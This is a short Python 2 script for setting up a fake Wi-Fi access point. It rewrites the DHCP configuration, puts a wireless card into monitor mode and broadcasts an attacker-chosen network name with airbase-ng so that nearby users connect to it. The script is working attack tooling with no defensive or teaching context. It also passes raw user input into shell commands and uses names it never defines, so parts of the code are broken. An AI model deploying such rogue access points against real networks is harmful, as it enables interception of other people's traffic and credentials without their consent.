import os
import subprocess

exam = '"Example"'

os.system("clear")
print ""
print  "   " + b.green +b.dick + b.under + "ONLY ONE INTERFACE MAY BE CONNECTED TO THE INTERNET"
print b.white + ""

time.sleep(5)
os.system("clear")
print "Creating a Fake Acces Point" 

print "Installing DHCP-Server..."
os.system("sudo apt-get install dhcp3-server") 

os.system("clear")
print ""
wfn = raw_input("Enter your Fake Access Wifi-Name " + b.green + "with quote sign" + b.white +"( %s ):  " % exam )

os.system("clear")
print ""
wfno = raw_input("Enter your Fake Access Wifi-Name" + b.green + " without quote sign:  " + b.white)
os.system("rm /etc/dhcpd.conf")
os.system("echo 'Authoritative;' > /etc/dhcpd.conf ")
os.system("echo 'Default-lease-time 600;' >> /etc/dhcpd.conf ")
os.system("echo 'Max-lease-time 7200;' >> /etc/dhcpd.conf ")
os.system("echo 'Subnet 192.168.1.0 netmask 255.255.255.0 {' >> /etc/dhcpd.conf ")
os.system("echo 'Option domain-name %s ;' >> /etc/dhcpd.conf " % wfn)
os.system("echo 'Option routers 192.168.1.1;' >> /etc/dhcpd.conf ")
os.system("echo 'Option subnet-mask 255.255.255.0;' >> /etc/dhcpd.conf ")
os.system("echo 'Option domain-name-servers 192.168.1.1;' >> /etc/dhcpd.conf ")
os.system("echo 'Range 192.168.1.2 192.168.1.40;' >> /etc/dhcpd.conf ")
os.system("echo '}' >> /etc/dhcpd.conf ")


os.system("clear")
os.system("airmon-ng")
intz = raw_input("Hosting Interface, that is " + b.green + b.under + b.dick + "not" + b.white + " connected to the internet:  ")

os.system("airmon-ng start %s" % intz)
os.system("clear")
os.system("airmon-ng")
print " Your Monitor Interface has to be mon0 "
subprocess.call(['gnome-terminal', '-e', 'python ./ipt.py'])

os.system("airbase-ng -c 11 -e %s mon0" % wfno)



